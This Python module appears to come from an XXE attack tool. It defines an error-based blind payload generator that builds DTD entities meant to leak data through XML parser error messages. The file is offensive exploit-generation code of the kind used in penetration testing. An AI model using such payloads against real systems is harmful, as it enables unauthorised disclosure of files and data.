from typing import Sequence, Union

from xeely.custom_xml import XMLEntity
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload.abstract import AbstractBlindPayloadGenerator
from xeely.xxe.attack.payload.factory import payload_factory

DTD_WRAPPER = "$-$"


@payload_factory.register(name=XXEAttackMode.ERROR.value)
class ErrorBasedPayloadGenerator(AbstractBlindPayloadGenerator):
    def _get_dtd_entity_value(self) -> str:
        return f"%nonExistingEntity;{DTD_WRAPPER}%{self.MALICIOUS_ENTITY_NAME};{DTD_WRAPPER}"

    def get_dtd_file_name(self) -> str:
        return "error.dtd"

    def _get_payload_entities(self) -> Sequence[Union[XMLEntity,str]]:
        return [*self._get_base_payload_entities(), "%wrapper;"]
